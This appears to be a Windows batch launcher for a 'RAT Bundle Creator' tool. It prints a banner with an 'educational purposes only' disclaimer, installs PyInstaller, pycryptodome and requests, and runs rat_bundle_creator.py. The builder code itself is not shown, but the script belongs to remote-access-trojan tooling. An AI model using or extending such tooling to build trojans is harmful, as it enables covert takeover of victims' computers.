@echo off
chcp 65001 >nul
cls

echo.
echo ██████╗  █████╗ ████████╗    ██████╗ ██████╗ ██╗   ██╗███████╗██████╗
echo ██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗
echo ██████╔╝███████║   ██║       ██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝
echo ██╔══██╗██╔══██║   ██║       ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
echo ██║  ██║██║  ██║   ██║       ██████╔╝██║  ██║ ╚████╔╝ ███████╗██║  ██║
echo ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
echo.
echo                Advanced Payload Bundle Creator
echo               FOR EDUCATIONAL PURPOSES ONLY
echo.

REM Check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo Error: Python is not installed or not in PATH
    pause
    exit /b 1
)

REM Check if required packages are installed
python -c "import PyInstaller, Crypto, requests" >nul 2>&1
if errorlevel 1 (
    echo Installing required packages...
    pip install --upgrade pip
    pip install pyinstaller pycryptodome requests
)

REM Run the main script
echo.
echo Starting RAT Bundle Creator...
echo.
python rat_bundle_creator.py %*

if errorlevel 1 (
    echo.
    echo Build failed!
    pause
    exit /b 1
) else (
    echo.
    echo Build completed successfully!
    pause
)